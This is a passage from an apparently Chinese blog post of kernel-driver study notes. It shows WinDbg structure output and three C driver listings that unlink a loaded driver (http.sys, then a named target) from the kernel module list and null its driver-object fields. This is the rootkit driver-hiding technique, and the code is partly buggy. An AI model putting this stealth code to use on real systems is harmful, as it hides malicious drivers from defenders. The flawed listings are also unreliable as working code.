<span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x014</span> NonPagedDebugInfo : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x018</span> DllBase          : <span class=\"number\">0x83e09000</span></span><br><span class=\"line\">   +<span class=\"number\">0x01c</span> EntryPoint       : <span class=\"number\">0x83f284d8</span></span><br><span class=\"line\">   +<span class=\"number\">0x020</span> SizeOfImage      : <span class=\"number\">0x412000</span></span><br><span class=\"line\">   +<span class=\"number\">0x024</span> FullDllName      : _UNICODE_STRING <span class=\"string\">&quot;\\SystemRoot\\system32\\ntkrnlpa.exe&quot;</span></span><br><span class=\"line\">   +<span class=\"number\">0x02c</span> BaseDllName      : _UNICODE_STRING <span class=\"string\">&quot;ntoskrnl.exe&quot;</span></span><br><span class=\"line\">   +<span class=\"number\">0x034</span> Flags            : <span class=\"number\">0x8004000</span></span><br><span class=\"line\">   +<span class=\"number\">0x038</span> LoadCount        : <span class=\"number\">0x6c</span></span><br><span class=\"line\">   +<span class=\"number\">0x03a</span> __Undefined5     : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x03c</span> __Undefined6     : <span class=\"number\">0</span></span><br><span class=\"line\">   +<span class=\"number\">0x040</span> CheckSum         : <span class=\"number\">0x3c88ac</span></span><br><span class=\"line\">   +<span class=\"number\">0x044</span> TimeDateStamp    : <span class=\"number\">0</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231202145017088.png\" alt=\"image-20231202145017088\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KLDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class=\"line\">\tLIST_ENTRY InLoadOrderLinks;</span><br><span class=\"line\">\tLIST_ENTRY <span class=\"built_in\">exp</span>;</span><br><span class=\"line\">\tULONG un;</span><br><span class=\"line\">\tULONG NonPagedDebugInfo;</span><br><span class=\"line\">\tULONG DllBase;</span><br><span class=\"line\">\tULONG EntryPoint;</span><br><span class=\"line\">\tULONG SizeOfImage;</span><br><span class=\"line\">\tUNICODE_STRING FullDllName;</span><br><span class=\"line\">\tUNICODE_STRING BaseDllName;</span><br><span class=\"line\">\tULONG Flags;</span><br><span class=\"line\">\tUSHORT LoadCount;</span><br><span class=\"line\">\tUSHORT __Undefined5;</span><br><span class=\"line\">\tULONG  __Undefined6;</span><br><span class=\"line\">\tULONG  CheckSum;</span><br><span class=\"line\">\tULONG  TimeDateStamp;</span><br><span class=\"line\">&#125; KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">extern</span> POBJECT_TYPE* IoDriverObjectType;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">DRIVERUNLOAD</span><span class=\"params\">(PDRIVER_OBJECT DriverObject)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDbgPrint(<span class=\"string\">&quot;unload\\r\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS <span class=\"title function_\">DriverEntry</span><span class=\"params\">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDbgBreakPoint();</span><br><span class=\"line\">\tPKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection;</span><br><span class=\"line\">\tPKLDR_DATA_TABLE_ENTRY pre = (PKLDR_DATA_TABLE_ENTRY)ldr-&gt;InLoadOrderLinks.Flink;</span><br><span class=\"line\">\tPKLDR_DATA_TABLE_ENTRY next = (PKLDR_DATA_TABLE_ENTRY)pre-&gt;InLoadOrderLinks.Flink;</span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"comment\">//UNICODE_STRING driverName = &#123; 0 &#125;;</span></span><br><span class=\"line\">\t<span class=\"comment\">//RtlInitUnicodeString(&amp;driverName, L&quot;\\\\driver\\\\http&quot;);</span></span><br><span class=\"line\"></span><br><span class=\"line\">\tUNICODE_STRING driverName = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">\tRtlInitUnicodeString(&amp;driverName, <span class=\"string\">L&quot;http.sys&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (next != pre)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (next-&gt;BaseDllName.Length != <span class=\"number\">0</span> &amp;&amp; RtlCompareUnicodeString(&amp;driverName, &amp;next-&gt;BaseDllName, TRUE)==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//PDRIVER_OBJECT httpDriver = NULL;</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">//NTSTATUS status = ObReferenceObjectByName(&amp;driverName, FILE_ALL_ACCESS, 0, 0, *IoDriverObjectType, KernelMode, NULL, *httpDriver);</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"comment\">//if (NT_SUCCESS(status))</span></span><br><span class=\"line\">\t\t\t<span class=\"comment\">//&#123;</span></span><br><span class=\"line\">\t\t\t\tDbgPrintEx(<span class=\"number\">77</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;%wZ\\r\\n&quot;</span>, &amp;next-&gt;FullDllName);</span><br><span class=\"line\">\t\t\t\tRemoveEntryList(&amp;next-&gt;InLoadOrderLinks);</span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">//httpDriver-&gt;DriverInit = NULL;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">//httpDriver-&gt;DriverSection = NULL;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t\t<span class=\"comment\">//&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"comment\">//break;</span></span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tnext = (PKLDR_DATA_TABLE_ENTRY)next-&gt;InLoadOrderLinks.Flink;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDriver-&gt;DriverUnload = DRIVERUNLOAD;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> STATUS_SUCCESS;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20231203225145824.png\" alt=\"image-20231203225145824\"></p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KLDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class=\"line\">\tLIST_ENTRY InLoadOrderLinks;</span><br><span class=\"line\">\tLIST_ENTRY <span class=\"built_in\">exp</span>;</span><br><span class=\"line\">\tULONG un;</span><br><span class=\"line\">\tULONG NonPagedDebugInfo;</span><br><span class=\"line\">\tULONG DllBase;</span><br><span class=\"line\">\tULONG EntryPoint;</span><br><span class=\"line\">\tULONG SizeOfImage;</span><br><span class=\"line\">\tUNICODE_STRING FullDllName;</span><br><span class=\"line\">\tUNICODE_STRING BaseDllName;</span><br><span class=\"line\">\tULONG Flags;</span><br><span class=\"line\">\tUSHORT LoadCount;</span><br><span class=\"line\">\tUSHORT __Undefined5;</span><br><span class=\"line\">\tULONG  __Undefined6;</span><br><span class=\"line\">\tULONG  CheckSum;</span><br><span class=\"line\">\tULONG  TimeDateStamp;</span><br><span class=\"line\">&#125; KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;</span><br><span class=\"line\"></span><br><span class=\"line\">NTKERNELAPI NTSTATUS <span class=\"title function_\">ObReferenceObjectByName</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">\t__in PUNICODE_STRING ObjectName,</span></span><br><span class=\"line\"><span class=\"params\">\t__in ULONG Attributes,</span></span><br><span class=\"line\"><span class=\"params\">\t__in_opt PACCESS_STATE AccessState,</span></span><br><span class=\"line\"><span class=\"params\">\t__in_opt ACCESS_MASK DesiredAccess,</span></span><br><span class=\"line\"><span class=\"params\">\t__in POBJECT_TYPE ObjectType,</span></span><br><span class=\"line\"><span class=\"params\">\t__in KPROCESSOR_MODE AccessMode, </span></span><br><span class=\"line\"><span class=\"params\">\t__inout_opt PVOID ParseContext,</span></span><br><span class=\"line\"><span class=\"params\">\t__out PVOID* Object</span></span><br><span class=\"line\"><span class=\"params\">)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">extern</span> POBJECT_TYPE* IoDriverObjectType;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">DRIVERUNLOAD</span><span class=\"params\">(PDRIVER_OBJECT DriverObject)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDbgPrint(<span class=\"string\">&quot;unload\\r\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS <span class=\"title function_\">DriverEntry</span><span class=\"params\">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDbgBreakPoint();</span><br><span class=\"line\">\tPKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection;</span><br><span class=\"line\">\tPKLDR_DATA_TABLE_ENTRY pre = (PKLDR_DATA_TABLE_ENTRY)ldr-&gt;InLoadOrderLinks.Flink;</span><br><span class=\"line\">\tPKLDR_DATA_TABLE_ENTRY next = (PKLDR_DATA_TABLE_ENTRY)pre-&gt;InLoadOrderLinks.Flink;</span><br><span class=\"line\"></span><br><span class=\"line\">\tUNICODE_STRING driverName1 = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">\tRtlInitUnicodeString(&amp;driverName1, <span class=\"string\">L&quot;\\\\driver\\\\http&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">\tUNICODE_STRING driverName = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">\tRtlInitUnicodeString(&amp;driverName, <span class=\"string\">L&quot;http.sys&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t<span class=\"keyword\">while</span> (next != pre)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">if</span> (next-&gt;BaseDllName.Length != <span class=\"number\">0</span> &amp;&amp; RtlCompareUnicodeString(&amp;driverName, &amp;next-&gt;BaseDllName, TRUE)==<span class=\"number\">0</span>)</span><br><span class=\"line\">\t\t&#123;</span><br><span class=\"line\">\t\t\tPDRIVER_OBJECT httpDriver = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\t\tNTSTATUS status = ObReferenceObjectByName(&amp;driverName1, FILE_ALL_ACCESS, <span class=\"number\">0</span>, <span class=\"number\">0</span>, *IoDriverObjectType, KernelMode, <span class=\"literal\">NULL</span>, &amp;httpDriver);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">\t\t\t<span class=\"keyword\">if</span> (NT_SUCCESS(status))</span><br><span class=\"line\">\t\t\t&#123;</span><br><span class=\"line\">\t\t\t\tRemoveEntryList(&amp;next-&gt;InLoadOrderLinks);</span><br><span class=\"line\">\t\t\t\thttpDriver-&gt;DriverInit = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\t\t\thttpDriver-&gt;DriverSection = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\t\t\t\thttpDriver-&gt;Type = <span class=\"number\">0</span>;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\tDbgPrintEx(<span class=\"number\">77</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;%wZ\\r\\n&quot;</span>, &amp;next-&gt;FullDllName);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\tnext = (PKLDR_DATA_TABLE_ENTRY)next-&gt;InLoadOrderLinks.Flink;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">\tpDriver-&gt;DriverUnload = DRIVERUNLOAD;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> STATUS_SUCCESS;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 隐藏当前驱动</span><br><span class=\"line\"># 调用完入口点在隐藏</span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> _<span class=\"title\">KLDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class=\"line\">\tLIST_ENTRY InLoadOrderLinks;</span><br><span class=\"line\">\tLIST_ENTRY <span class=\"built_in\">exp</span>;</span><br><span class=\"line\">\tULONG un;</span><br><span class=\"line\">\tULONG NonPagedDebugInfo;</span><br><span class=\"line\">\tULONG DllBase;</span><br><span class=\"line\">\tULONG EntryPoint;</span><br><span class=\"line\">\tULONG SizeOfImage;</span><br><span class=\"line\">\tUNICODE_STRING FullDllName;</span><br><span class=\"line\">\tUNICODE_STRING BaseDllName;</span><br><span class=\"line\">\tULONG Flags;</span><br><span class=\"line\">\tUSHORT LoadCount;</span><br><span class=\"line\">\tUSHORT __Undefined5;</span><br><span class=\"line\">\tULONG  __Undefined6;</span><br><span class=\"line\">\tULONG  CheckSum;</span><br><span class=\"line\">\tULONG  TimeDateStamp;</span><br><span class=\"line\">&#125; KLDR_DATA_TABLE_ENTRY, * PKLDR_DATA_TABLE_ENTRY;</span><br><span class=\"line\"></span><br><span class=\"line\">NTKERNELAPI NTSTATUS <span class=\"title function_\">ObReferenceObjectByName</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">\t__in PUNICODE_STRING ObjectName,</span></span><br><span class=\"line\"><span class=\"params\">\t__in ULONG Attributes,</span></span><br><span class=\"line\"><span class=\"params\">\t__in_opt PACCESS_STATE AccessState,</span></span><br><span class=\"line\"><span class=\"params\">\t__in_opt ACCESS_MASK DesiredAccess,</span></span><br><span class=\"line\"><span class=\"params\">\t__in POBJECT_TYPE ObjectType,</span></span><br><span class=\"line\"><span class=\"params\">\t__in KPROCESSOR_MODE AccessMode,</span></span><br><span class=\"line\"><span class=\"params\">\t__inout_opt PVOID ParseContext,</span></span><br><span class=\"line\"><span class=\"params\">\t__out PVOID* Object</span></span><br><span class=\"line\"><span class=\"params\">)</span>;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">extern</span> POBJECT_TYPE* IoDriverObjectType;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">DriverHide</span><span class=\"params\">(PWCH ObjName)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tLARGE_INTEGER in = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">\tin.QuadPart = <span class=\"number\">-10000</span> * <span class=\"number\">5000</span>;</span><br><span class=\"line\">\tKeDelayExecutionThread(KernelMode, FALSE, in.QuadPart);</span><br><span class=\"line\">\tUNICODE_STRING driverName1 = &#123; <span class=\"number\">0</span> &#125;;</span><br><span class=\"line\">\tRtlInitUnicodeString(&amp;ObjName, <span class=\"string\">L&quot;\\\\driver\\\\http&quot;</span>);</span><br><span class=\"line\">\tPDRIVER_OBJECT httpDriver = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tNTSTATUS status = ObReferenceObjectByName(&amp;driverName1, FILE_ALL_ACCESS, <span class=\"number\">0</span>, <span class=\"number\">0</span>, *IoDriverObjectType, KernelMode, <span class=\"literal\">NULL</span>, &amp;httpDriver);</span><br><span class=\"line\">\tPKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)httpDriver-&gt;DriverSection;</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (NT_SUCCESS(status))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\thttpDriver-&gt;DriverSection = ldr-&gt;InLoadOrderLinks.Flink;</span><br><span class=\"line\">\t\tRemoveEntryList(&amp;ldr-&gt;InLoadOrderLinks);</span><br><span class=\"line\">\t\tDbgPrintEx(<span class=\"number\">77</span>, <span class=\"number\">0</span>, <span class=\"string\">&quot;%wZ\\r\\n&quot;</span>, &amp;ldr-&gt;FullDllName);</span><br><span class=\"line\">\t\thttpDriver-&gt;DriverInit = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">\t\t<span class=\"comment\">//httpDriver-&gt;Type = 0;</span></span><br><span class=\"line\">\t\tObDereferenceObject(httpDriver);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">DRIVERUNLOAD</span><span class=\"params\">(PDRIVER_OBJECT DriverObject)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDbgPrint(<span class=\"string\">&quot;unload\\r\\n&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">NTSTATUS <span class=\"title function_\">DriverEntry</span><span class=\"params\">(PDRIVER_OBJECT pDriver, PUNICODE_STRING pReg)</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">\tDbgBreakPoint();</span><br><span class=\"line\">\t<span class=\"comment\">/*</span></span><br><span class=\"line\"><span class=\"comment\">\tPKLDR_DATA_TABLE_ENTRY ldr = (PKLDR_DATA_TABLE_ENTRY)pDriver-&gt;DriverSection;</span></span><br><span class=\"line\"><span class=\"comment\">\tPKLDR_DATA_TABLE_ENTRY pre = (PKLDR_DATA_TABLE_ENTRY)ldr-&gt;InLoadOrderLinks.Flink;</span></span><br><span class=\"line\"><span class=\"comment\">\tPKLDR_DATA_TABLE_ENTRY next = (PKLDR_DATA_TABLE_ENTRY)pre-&gt;InLoadOrderLinks.Flink;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tUNICODE_STRING driverName1 = &#123; 0 &#125;;</span></span><br><span class=\"line\"><span class=\"comment\">\tRtlInitUnicodeString(&amp;driverName1, L&quot;\\\\driver\\\\http&quot;);</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\tUNICODE_STRING driverName = &#123; 0 &#125;;</span></span><br><span class=\"line\"><span class=\"comment\">\tRtlInitUnicodeString(&amp;driverName, L&quot;http.sys&quot;);</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\twhile (next != pre)</span></span><br><span class=\"line\"><span class=\"comment\">\t&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\tif (next-&gt;BaseDllName.Length != 0 &amp;&amp; RtlCompareUnicodeString(&amp;driverName, &amp;next-&gt;BaseDllName, TRUE) == 0)</span></span><br><span class=\"line\"><span class=\"comment\">\t\t&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tPDRIVER_OBJECT httpDriver = NULL;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tNTSTATUS status = ObReferenceObjectByName(&amp;driverName1, FILE_ALL_ACCESS, 0, 0, *IoDriverObjectType, KernelMode, NULL, &amp;httpDriver);</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tif (NT_SUCCESS(status))</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t&#123;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\tRemoveEntryList(&amp;next-&gt;InLoadOrderLinks);</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\thttpDriver-&gt;DriverInit = NULL;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\thttpDriver-&gt;DriverSection = NULL;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t\thttpDriver-&gt;Type = 0;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tDbgPrintEx(77, 0, &quot;%wZ\\r\\n&quot;, &amp;next-&gt;FullDllName);</span></span><br><span class=\"line\"><span class=\"comment\">\t\t\tbreak;</span></span><br><span class=\"line\"><span class=\"comment\">\t\t&#125;</span></span><br><span class=\"line\"><span class=\"comment\"></span></span><br><span class=\"line\"><span class=\"comment\">\t\tnext = (PKLDR_DATA_TABLE_ENTRY)next-&gt;InLoadOrderLinks.Flink;</span></span><br><span class=\"line\"><span class=\"comment\">\t&#125;</span></span><br><span class=\"line\"><span class=\"comment\">\t*/</span></span><br><span class=\"line\">\tHANDLE hThread = <span class=\"literal\">NULL</span>;</span><br><span class=\"line\">\tNTSTATUS status = PsCreateSystemThread(&amp;hThread, THREAD_ALL_ACCESS, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, <span class=\"literal\">NULL</span>, DriverHide, <span class=\"string\">L&quot;\\\\driver\\\\http&quot;</span>);</span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (NT_SUCCESS(status))</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\tNtClose(hThread);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tpDriver-&gt;DriverUnload = DRIVERUNLOAD;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> STATUS_SUCCESS;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>dll 驱动必须通过主驱动调用加载</p>\n<h3 id=\"蓝屏分析\"><a 